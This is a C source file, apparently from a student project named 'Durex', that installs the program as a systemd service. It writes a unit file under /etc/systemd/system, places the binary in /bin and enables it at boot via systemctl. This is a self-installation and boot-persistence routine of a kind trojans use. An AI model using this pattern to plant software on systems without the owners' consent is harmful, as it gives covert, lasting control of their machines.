/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install_service.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:45:56 by banthony          #+#    #+#             */
/*   Updated: 2019/11/19 18:33:05 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Durex.h"

extern char **environ;

static t_bool	exec_command(char **command, char *info)
{
	pid_t		pid;

	if ((pid = fork()) < 0)
	{
		durex_log("Can't execute command:", LOG_ERROR);
		durex_log(command[0], LOG_ERROR);
		return (false);
	}
	// Child
	else if (pid == 0)
	{
		durex_log(info, LOG_INFO);
		execve(command[0], command, environ);
		durex_log(strerror(errno), LOG_ERROR);
		exit(EXIT_FAILURE);
	}
	// Father
	else
		waitpid(pid, NULL, 0);
	return (true);
}

/*
**	Check each following path to ensure Durex is installed:
**	/etc/systemd/system/durex.service
**	/etc/systemd/system/multi-user.target.wants/durex.service
**	/bin/Durex
*/
static t_bool durex_is_installed(void)
{
	const char	*files[] = {SERVICE_FILE, SERVICE_INSTALL_FILE, SERVICE_BIN, NULL};
	const char	*found_suffix = " => OK !";
	const char	*not_found_suffix = " => KO !";
	char		tmp[PATH_MAX] = {0};
	int			install_check;
	int			i;

	i = -1;
	install_check = 0;
	durex_log("Checking  Installation :", LOG_WARNING);
	while (files[++i])
	{
		ft_strncpy(tmp, "* ", PATH_MAX);
		ft_strncat(tmp, files[i], ft_strlen(files[i]));
		if (!access(files[i], F_OK))
		{
			ft_strncat(tmp, found_suffix, ft_strlen(found_suffix));
			durex_log(tmp, LOG_INFO);
			install_check++;
		}
		else
		{
			ft_strncat(tmp, not_found_suffix, ft_strlen(not_found_suffix));
			durex_log(tmp, LOG_WARNING);
		}
	}
	return (install_check == 3);
}

void install_service(void)
{
	const char	*durex_service = SERVICE_FILE_CONTENT;
	char		*systemctl_reload[] = { "/bin/systemctl", "daemon-reload", NULL};
	char		*enable_durex[] = {"/bin/systemctl", "enable", "durex", NULL };
	int			fd;
	int			ret;

	durex_log("======== Durex  Installation ========", LOG_WARNING);
	if (durex_is_installed())
		return ;
	// TODO call uninstall function to clear an eventual partial install
	if ((fd = open(SERVICE_PATH, O_CREAT | O_EXCL | O_WRONLY, S_IRWXU)) < 0)
	{
		durex_log("Failed: Can't create durex.service.", LOG_WARNING);
		return ;
	}
	ret = write(fd, durex_service, ft_strlen(durex_service));
	if (ret < 0 || ret < (int)ft_strlen(durex_service))
	{
		durex_log("Failed: Can't write correctly durex.service content.", LOG_WARNING);
		return ;
	}
	durex_log("durex.service has been correctly generated.", LOG_INFO);
	close(fd);
	// Copy Durex binary into /bin/Durex
	exec_command(systemctl_reload, "systemctl reload daemon ...");
	exec_command(enable_durex, "systemctl enable durex ...");
}
